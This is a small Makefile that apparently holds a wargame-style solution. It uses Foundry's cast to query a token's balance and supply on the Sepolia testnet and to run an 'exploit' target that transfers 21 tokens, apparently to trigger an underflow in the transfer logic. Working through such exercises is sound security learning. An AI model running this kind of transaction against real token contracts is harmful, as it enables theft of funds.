-include ../../.env

.PHONY: balance exploit verify

balance:
	cast call $(TOKEN_TARGET) \
		"balanceOf(address)(uint256)" \
		$(ATTACKER) \
		--rpc-url $(RPC_URL_SEPOLIA)

exploit:
	cast send $(TOKEN_TARGET) \
		"transfer(address,uint256)" \
		$(FOXY_BOY) \
		21 \
		--rpc-url $(RPC_URL_SEPOLIA) \
		--account $(ACCOUNT_NAME)

total-supply:
	cast call $(TOKEN_TARGET) \
		"totalSupply()" \
		--rpc-url $(RPC_URL_SEPOLIA)

verify:
	make balance
